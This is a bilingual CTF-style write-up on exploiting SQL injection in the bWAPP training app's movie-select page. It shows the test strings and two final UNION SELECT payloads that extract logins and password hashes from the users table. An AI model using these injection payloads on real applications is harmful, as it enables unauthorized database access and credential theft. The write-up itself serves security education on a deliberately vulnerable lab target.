# SQL Injection (GET/Select)
---

Choose your language / Выберите язык:

- 🇬🇧 [English](README.en.md)
- 🇷🇺 [Русский](README.md)

# Disclaimer
---

**The text was written and translated by the author manually. A language model was used for formatting and stylistic editing.**

**This material is provided for educational and research purposes only. 
I do not encourage or call for unauthorized access to information systems or violation of the law. 
In my opinion, one of the most effective ways to combat cybercrime is to educate both everyday users and managers, as well as developers of digital products about common vulnerabilities that could potentially be exploited by malicious actors to carry out unlawful acts.**

**⚠️ All actions described in this document were performed within an authorized research environment (CTF/test platform), without violating the rights of third parties or current legislation.**

**Unauthorized interference with computer systems, violation of data storage and processing rules, and other forms of so-called "black-hat" hacking are contrary to law and the ethics of information security.**

**I adhere to the principles of ethical research and responsible vulnerability disclosure.**

---

# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges based on the ***SQL Injection vulnerability***. (**A03:2021 - Injection**)

***SECURITY LEVELS COVERED***
- Low

# Target
---

![[images/SqliGetSelectTarget.png]]

# Functionality
---

The application allows us to choose a movie from the list provided:

![[images/SqliGetSelectFunction.png]]

### Probable SQL query:

```SQL
SELECT * FROM movies WHERE id="$variable"
```

# Exploitation
---

Testing with standard payload `1' OR 1=1 -- ` returned an error, yet the `1 OR 1=1 -- ` didn't fail:

![[images/SqliGetSelectTest.png]]

Passing a `UNION` based payload earlier used in [[19.09.2025/SQL Injection (GET Search)/README.en]] didn't return any errors, yet did not allow to retrieve any information from the (likely) users table:

![[images/SqlietGetSelectTest2.png]]

Passing `UNION` based payloads with `ORDER BY` additions allowed to retrieve data from the `users` table by modifying the `ORDER BY` parameter:

![[images/SqliGetSelectPwd.png]]

![[images/SqliGetSelectUsers.png]]

## Final payloads

Retrieving hashed password entries:

```SQL

1 UNION SELECT login, password, NULL, NULL, NULL, NULL, NULL FROM users ORDER BY 2 --
 
```

Retrieving login entries:

```SQL

1 UNION SELECT password, login, NULL, NULL, NULL, NULL, NULL FROM users ORDER BY 2 --
 
```
